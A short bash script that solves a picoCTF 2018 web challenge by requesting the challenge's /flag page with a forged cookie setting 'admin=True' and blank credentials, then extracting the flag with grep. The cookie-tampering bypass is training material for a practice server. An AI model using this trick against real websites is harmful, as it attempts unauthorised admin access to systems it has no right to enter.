#!/usr/bin/bash

port=62746
url="http://2018shell.picoctf.com:$port/flag"
page=$(curl -S $url -H 'Cookie: password=; username=; admin=True')
echo $page | grep -o -E "picoCTF{.*}"